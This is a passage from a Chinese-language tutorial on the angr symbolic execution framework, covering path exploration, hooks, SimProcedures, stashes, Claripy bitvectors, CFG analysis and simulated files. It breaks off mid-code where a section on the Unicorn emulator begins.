deadended, <span class="number">1</span> found&gt;</span><br></pre></td></tr></table></figure><p>期望条件也可以是自定义的以 <em>状态</em> 为参数的布尔函数。例如，若是我们想要寻找一条输出指定字符串的路径，可以选择通过判断该字符串是否在输出中的方式，我们可以通过 <code>state.posix.dumps(文件描述符)</code> 来获取对应文件描述符上的字符流：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.explore(find=foo)</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">17</span> deadended, <span class="number">1</span> found&gt;</span><br></pre></td></tr></table></figure><p>除了 <code>find</code> 参数外，我们也可以指定 <code>avoid</code> 参数——模拟器运行中应当要<strong>避开</strong>的条件，当一个状态符合这样的条件时，其会被放在 <code>.avoided</code> 列表中并不再往后执行。类似地，<code>avoid</code> 参数可以是某个地址，也可以是自定义的布尔函数。</p><p>此外，我们还可以通过指定 <code>num_find</code> 参数来指定需要寻找的符合条件的状态的数量，若未指定则会在 <code>.found</code> 列表中存储所有的符合条件的状态。</p><h4 id="explore"><a href="#explore" class="headerlink" title="explore"></a>explore</h4><p>explore是在ctf中使用的比较多的共能</p><p>通过调用 explore 方法，我们可以探索执行路径，在进行 explore 时，可以设置 find 和 avoid 参数，以便找到符合我们预期的路径。</p><p>函数接口如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">explore</span>(<span class="params">self, stash=<span class="string">&#x27;active&#x27;</span>, n=<span class="literal">None</span>, find=<span class="literal">None</span>, avoid=<span class="literal">None</span>, find_stash=<span class="string">&#x27;found&#x27;</span>, avoid_stash=<span class="string">&#x27;avoid&#x27;</span>, cfg=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                num_find=<span class="number">1</span>, **kwargs</span>):</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr_run</span>():</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;./bin5&#x27;</span>)</span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simgr(state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x08048783</span>)</span><br><span class="line">    payload = simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;payload=<span class="subst">&#123;b2a_hex(payload)&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">angr_run()</span><br></pre></td></tr></table></figure><p>angr 提供了多种 <code>explore</code> 技术，即进行路径探索时所采用的策略，可以在 <code>angr.exploration_techniques</code> 条目下中找到。</p><p>每个策略都是 <code>ExplorationTechnique</code> 对象，根据策略不同，angr 对 <code>ExplorationTechnique</code> 中的 <code>setup、step</code> 等方法进行覆盖。</p><p>通过 <code>simgr.use_technique(tech)</code>设定不同的策略。</p><p>下面部分列出策略</p><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>DFS</td><td>Depth first search. Keeps only one state active at once, putting the rest in the <code>deferred</code> stash until it deadends or errors.</td></tr><tr><td>LengthLimiter</td><td>Puts a cap on the maximum length of the path a state goes through.</td></tr><tr><td>Tracer</td><td>An exploration technique that causes execution to follow a dynamic trace recorded from some other source.</td></tr><tr><td>Oppologist</td><td>if this technique is enabled and angr encounters an unsupported instruction, it will concretize all the inputs to that instruction and emulate the single instruction using the unicorn engine, allowing execution to continue.</td></tr><tr><td>Threading</td><td>Adds thread-level parallelism to the stepping process.</td></tr><tr><td>Spiller</td><td>When there are too many states active, this technique can dump some of them to disk in order to keep memory consumption low.</td></tr></tbody></table></div><p>如果要让angr跑程序的话，有两点会提高效率，一种是hook代码，一种是设定avoid条件。hook代码即人工把某部分汇编代码翻译成python之后告诉angr，当你执行到这里的时候它其实是这个意思，就不用让他再跑VEX了。路径爆炸是符号执行一定要解决的问题，所以说可以提前帮助angr做剪枝，使得它不会再其他不可能进行下去的分支上耽误太长时间。</p><p>getav的思路: 其实还是找规律，一般来说，基本都是不符合条件就直接跳下去，不再继续执行函数，所以说这就是明显的特征之一，找到跳下去的部分，用vex.next看如果不跳下去会到什么地址，然后直接把另一条路拉到avoid里就OK了，这是第一个特征。</p><h4 id="Function-hook"><a href="#Function-hook" class="headerlink" title="Function hook"></a>Function hook</h4><p>有的时候我们会有需要 hook 掉某个函数的需求，此时我们可以使用 <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> 来 hook 掉对应的 call 指令：</p><ul><li><code>call_insn_addr</code>：被 hook 的 call 指令的地址</li><li><code>my_function</code> ：我们的自定义 python 函数</li><li><code>length</code>： call 指令的长度</li></ul><p>我们的自定义函数应当为接收 <code>state</code> 作为参数的函数，angr 还提供了 decorator 语法糖，因此以下两种写法都可以：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># method 1</span></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x1234</span>, length=<span class="number">5</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_hook_func</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># do something, this is an example</span></span><br><span class="line">    state.regs.eax = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_hook_func2</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># do something, this is an example</span></span><br><span class="line">    state.regs.eax = <span class="number">0xdeadbeef</span></span><br><span class="line">proj.hook(addr = <span class="number">0x5678</span>, hook = my_hook_func2, length = <span class="number">5</span>)</span><br></pre></td></tr></table></figure><h4 id="Simulated-Procedure"><a href="#Simulated-Procedure" class="headerlink" title="Simulated Procedure"></a>Simulated Procedure</h4><p>在 angr 中 <code>angr.SimProcedure</code> 类用来表示<strong>在一个状态上的一个运行过程</strong>——即函数实际上是一个 SimPrecedure。</p><p>我们可以通过创建一个继承自 <code>angr.SimProcedure</code> 的类并重写 <code>run()</code> 方法的方式来表示一个自定义函数，其中 <code>run()</code> 方法的参数为该函数所接收的参数：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyProcedure</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, arg1, arg2</span>):</span><br><span class="line">        <span class="comment"># do something, this&#x27;s an example</span></span><br><span class="line">        <span class="keyword">return</span> self.state.memory.load(arg1, arg2)</span><br></pre></td></tr></table></figure><p>自定义函数过程主要用于对文件中的原有函数进行替换，例如 angr 缺省会用内置的一些 SimProcedure 来替换掉一些库函数。</p><p>若我们已经有该二进制文件的符号表，我们可以直接使用 <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> 来自动 hook 掉文件中所有的对应符号，其中 <code>run()</code> 方法的<strong>参数为被替换函数所接收的参数</strong>，示例如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyProcedure</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, arg1, arg2</span>):</span><br><span class="line">        <span class="comment"># do something, this&#x27;s an example</span></span><br><span class="line">        <span class="keyword">return</span> self.state.memory.load(arg1, arg2)</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;func_to_hook&#x27;</span>, MyProcedure())</span><br></pre></td></tr></table></figure><p>当然，在 SimProcedure 的 <code>run()</code> 过程中我们也可以使用一些有用的成员函数：</p><ul><li><code>ret(expr)</code>: 函数返回。</li><li><code>jump(addr)</code>: 跳转到指定地址。</li><li><code>exit(code)</code>: 终止程序。</li><li><code>call(addr, args, continue_at)</code>: 调用文件中的函数。</li><li><code>inline_call(procedure, *args)</code>: 内联地调用另一个 SimProcedure。</li></ul><h4 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h4><p>在 angr 当中，不同的状态被组织到 simulation manager 的不同的 stash 当中，我们可以按照自己的需求进行步进、过滤、合并、移动等。</p><p>在 angr 当中一共有以下几种 stash：</p><ul><li><code>simgr.active</code>：活跃的状态列表。在未指定替代的情况下会被模拟器默认执行</li><li><code>simgr.deadended</code>：死亡的状态列表。当一个状态无法再被继续执行时（例如没有有效指令、无效的指令指针、不满足其所有的后继（successors））便会被归入该列表</li><li><code>simgr.pruned</code>：被剪枝的状态列表。在指定了 <code>LAZY_SOLVES</code> 时，状态仅在必要时检查可满足性，当一个状态在指定了 <code>LAZY_SOLVES</code> 时被发现是不可满足的（unsat），状态层（state hierarchy）将会被遍历以确认在其历史中最初变为不满足的时间，该点及其所有后代都会被 <em>剪枝</em> （pruned）并放入该列表</li><li><code>simgr.unconstrained</code>：不受约束的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unconstrained=True</code>，则被认为<strong>不受约束的</strong>（unconstrained，即指令指针被用户数据或其他来源的符号化数据控制）状态会被归入该列表</li><li><code>simgr.unsat</code>：不可满足的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unsat=True</code>，则被认为无法被满足的（unsatisfiable，即存在<strong>约束冲突</strong>的状态，例如在同一时刻要求输入既是<code>&quot;AAAA&quot;</code> 又是 <code>&quot;BBBB&quot;</code>）状态会被归入该列表</li></ul><p>还有一种不是 stash 的状态列表——<code>errored</code>，若在执行中产生了错误，则状态与其产生的错误会被包裹在一个 <code>ErrorRecord</code> 实例中（可通过 <code>record.state</code> 与 <code>record.error</code> 访问），该 record 会被插入到 <code>errored</code> 中，我们可以通过 <code>record.debug()</code> 启动一个调试窗口</p><p><strong>stash操作</strong></p><p>我们可以使用 <code>stash.move()</code> 来在 stash 之间转移放置状态，用法如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="string">&#x27;active&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在转移当中我们还可以通过指定 <code>filter_func</code> 参数来进行过滤：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">filter_func</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">b&#x27;arttnba3&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="string">&#x27;active&#x27;</span>, filter_func = filter_func)</span><br></pre></td></tr></table></figure><p>stash 本质上就是个 list，因此在初始化时我们可以通过字典的方式指定每个 stash 的初始内容：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,</span><br><span class="line"><span class="meta">... </span>    stashes = &#123;</span><br><span class="line"><span class="meta">... </span>            <span class="string">&#x27;active&#x27;</span>:[init_state],</span><br><span class="line"><span class="meta">... </span>            <span class="string">&#x27;found&#x27;</span>:[],</span><br><span class="line"><span class="meta">... </span>    &#125;)</span><br></pre></td></tr></table></figure><h4 id="unconstrained"><a href="#unconstrained" class="headerlink" title="unconstrained"></a>unconstrained</h4><p>当一个指令有很多分支的可能性时，称之为不受约束(unconstrained)的状态， 比如说当用户的输入决定下一条指令的位置。</p><p>angr 在遇到不受约束的状态时会将其抛出，在处理溢出时我们可以选择关闭这个默认行为,以此求解payload</p><h3 id="Claripy"><a href="#Claripy" class="headerlink" title="Claripy"></a>Claripy</h3><p><code>Claripy</code> 是 angr 的<strong>求解引擎</strong>（solver engine），其内部会无缝混合使用几种后端（concrete bitvectors、SAT solvers 等），对于我们而言一般不需要直接与其进行交互，但通常我们会使用其提供的一些接口</p><h4 id="bitvector-位向量"><a href="#bitvector-位向量" class="headerlink" title="bitvector - 位向量"></a>bitvector - 位向量</h4><p><strong>位向量</strong>（bitvector）是 angr 求解引擎中的一个重要部分，其表示了 <strong>一串比特位</strong> （a sequence of bits）。</p><p>我们可以通过 <code>claripy.BVV(int_value, size_in_bits)</code> 或 <code>claripy.BVV(string_value)</code> 创建带有具体值（concrete value）的指定长度的位向量值（bitvector value）：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="string">b&#x27;flagflag&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv</span><br><span class="line">&lt;BV64 <span class="number">0x666C6167666C6167</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="number">0xdeadbeef</span>, <span class="number">32</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv2</span><br><span class="line">&lt;BV32 <span class="number">0xdeadbeef</span>&gt;</span><br></pre></td></tr></table></figure><p>下面是 Python int 和 bitvectors 之间的转换：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bv = state.solver.BVV(<span class="number">0x1234</span>, <span class="number">32</span>)   <span class="comment"># 创建值 0x1234 的 BV32 对象</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bv</span><br><span class="line">&lt;BV32 <span class="number">0x1234</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(bv),cast_to=<span class="built_in">bytes</span>)          <span class="comment"># 将 BV32 对象转换为 Python int</span></span><br><span class="line"><span class="string">&#x27;0x1234&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bv = state.solver.BVV(<span class="number">0x1234</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bv</span><br><span class="line">&lt;BV64 <span class="number">0x1234</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(bv))</span><br><span class="line"><span class="string">&#x27;0x1234L&#x27;</span></span><br></pre></td></tr></table></figure><p>相同长度的位向量可以进行运算，对于不同长度的位向量则可以通过 <code>.zero_extend(extended_bits)</code> 完成位扩展（0 填充）后进行运算，需要注意的是位向量的值运算<u>同样存在溢出</u>：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="number">32</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv + bvv2</span><br><span class="line">&lt;BV64 <span class="number">0x617274754d102022</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv * bvv</span><br><span class="line">&lt;BV64 <span class="number">0x9842ff8e63f3b029</span>&gt;</span><br></pre></td></tr></table></figure><p>位向量除了代表具体值（concrete value）的 <code>bitvector value</code> 以外，还有代表<strong>符号变量</strong>（symbolic variable）的 <code>bitvector symbol</code>，我们可以通过 <code>claripy.BVS(name, size_in_bits)</code> 创建带名字的指定长度的位向量符号（bitvector symbol）：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="string">&quot;x&quot;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs</span><br><span class="line">&lt;BV64 x_0_64&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="string">&quot;y&quot;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs2</span><br><span class="line">&lt;BV64 y_1_64&gt;</span><br></pre></td></tr></table></figure><p>位向量符号与位向量值之间同意可以进行运算，组合成更加复杂的表达式：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs3</span><br><span class="line">&lt;BV64 (x_0_64 * y_1_64 + <span class="number">0x617274746e626133</span>) / x_0_64&gt;</span><br></pre></td></tr></table></figure><p>我们可以通过 <code>.op</code> 与 <code>.args</code> 获得位向量的运算类型与参数：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv.op</span><br><span class="line"><span class="string">&#x27;BVV&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs.op</span><br><span class="line"><span class="string">&#x27;BVS&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs3.op</span><br><span class="line"><span class="string">&#x27;__floordiv__&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs3.args</span><br><span class="line">(&lt;BV64 x_0_64 * y_1_64 + <span class="number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv.args</span><br><span class="line">(<span class="number">7021802812440994099</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>使用 bitvectors 可以直接来设置寄存器和内存的值，当传入的是 Python int 时，angr 会自动将其转换成 bitvectors：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.regs.rsi = state.solver.BVV(<span class="number">3</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.regs.rsi</span><br><span class="line">&lt;BV64 <span class="number">0x3</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0x1000</span>].long = <span class="number">4</span>          <span class="comment"># 在地址 0x1000 存放一个 long 类型的值 4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0x1000</span>].long.resolved     <span class="comment"># .resolved 获取 bitvectors</span></span><br><span class="line">&lt;BV64 <span class="number">0x4</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0x1000</span>].long.concrete     <span class="comment"># .concrete 获得 Python int</span></span><br><span class="line"><span class="number">4L</span></span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>angr 提供了大量函数用于程序分析，在这些函数在 <code>Project.analyses.</code>，例如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cfg = p.analyses.CFGFast()          <span class="comment"># 得到 control-flow graph</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cfg</span><br><span class="line">&lt;CFGFast Analysis Result at <span class="number">0x7f1265b62650</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cfg.graph</span><br><span class="line">&lt;networkx.classes.digraph.DiGraph <span class="built_in">object</span> at <span class="number">0x7f1265e77310</span>&gt; <span class="comment"># 详情请查看 networkx</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(cfg.graph.nodes())</span><br><span class="line"><span class="number">934</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>entry_node = cfg.get_any_node(proj.entry)   <span class="comment"># 得到给定地址的 CFGNode</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>entry_node</span><br><span class="line">&lt;CFGNode <span class="number">0x401370</span>[<span class="number">42</span>]&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">list</span>(cfg.graph.successors(entry_node)))</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>如果要想画出图来，还需要安装 matplotlib。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>matplotlib.use(<span class="string">&#x27;Agg&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nx.draw(cfg.graph)                  <span class="comment"># 画图</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>plt.savefig(<span class="string">&#x27;temp.png&#x27;</span>)             <span class="comment"># 保存</span></span><br></pre></td></tr></table></figure><h3 id="模拟文件"><a href="#模拟文件" class="headerlink" title="模拟文件"></a>模拟文件</h3><p>在 angr 当中与文件系统间的操作是通过 <code>SimFile</code> 对象完成的，SimFile 为对 <em>存储</em> 的抽象模型，一个 SimFile 对象可以表示一系列的字节、符号等。</p><p>我们可以通过 <code>angr.SimFile()</code> 来创建一个模拟文件，创建带有具体值与符号变量的 SimFile 例子如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> angr, claripy</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="string">&#x27;a_file&#x27;</span>, content = <span class="string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="string">&#x27;bvs&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="string">&#x27;another_file&#x27;</span>, bvs, size=<span class="number">8</span>) <span class="comment"># size in bytes there</span></span><br></pre></td></tr></table></figure><p>模拟文件需要与特定的状态进行关联，通过 <code>state.fs.insert(sim_file)</code> 或 <code>sim_file.set_state(state)</code> 我们可以将 SimFile 插入到一个状态的文件系统中：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="string">&#x27;test_file&#x27;</span>, sim_file)</span><br></pre></td></tr></table></figure><p>我们还可以从文件中读取内容：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos = <span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><p>对于 <em>流</em> （Streams，例如标准 IO、TCP 连接等）类型的文件，我们可以用 <code>angr.SimPackets()</code> 来创建：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="string">&#x27;my_packet&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sim_packet</span><br><span class="line">&lt;angr.storage.file.SimPackets <span class="built_in">object</span> at <span class="number">0x7f75626a2e80</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h3><p>CFG 是一个表示程序中基本块之间控制流关系的图形结构，它可以帮助分析程序的结构和逻辑。</p><p>angr有两种分析获取cfg的方法</p><p><code>CFGFast</code> 分析器通过<u>静态分析</u>程序的二进制代码来构建控制流图，而不需要实际执行程序。因此，它是一种快速获取程序结构信息的方法。</p><p><code>CFGEmulated</code>通过<u>动态符号执行</u>获得更加准确的CFG。</p><p>但是可以看到在很多时候使用<code>cfg = proj.analyses.CFGFast(normalize=True, force_complete_scan=False)</code>获得CFG后还会将其转化为supergraph</p><p>为什么要这样?因为angr生成的CFG与ida的CFG并不相同</p><ol><li>angr基本上只要遇到会修改pc计数器的指令都会将其视作一个基本块的结束,而<u>ida并不会将可返回函数的调用(<strong>call</strong>)作为基本块的结束</u></li><li>angr的cfg以整个程序为单位(当然也可以转化为函数的进行操作),而ida以函数为单位</li></ol><p>而转化为supergraph之后的cfg形式就与ida的cfg更为相似,那为什么要转为ida形式的?就是为了避免某些功能函数(例如标准输入)被算到一个基本块,从而导致一些奇奇怪怪的问题</p><h2 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a>unicorn</h2><p>unicorn与angr类似,不过也有一些区别</p><ul><li><strong>Unicorn</strong>：Unicorn 是一个模拟器，它可以模拟多种 CPU 架构的指令执行。它提供了一种运行二进制代码的方式，使得用户可以在不真正运行二进制程序的情况下观察其行为。</li><li><strong>Angr</strong>：Angr 是一个符号执行框架，它使用符号执行技术来对二进制程序进行分析。Angr 能够在程序的输入空间中搜索，以找到满足特定条件的输入，以此来探索程序的执行路径和可能的漏洞。</li></ul><h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><p><a href="https://github.com/unicorn-engine/unicorn/blob/master/bindings/python/sample_x86.py">unicorn/bindings/python/sample_x86.py at master · unicorn-engine/unicorn (github.com)</a>官方给的例子,不过有点长,用wiki中例子做示范</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 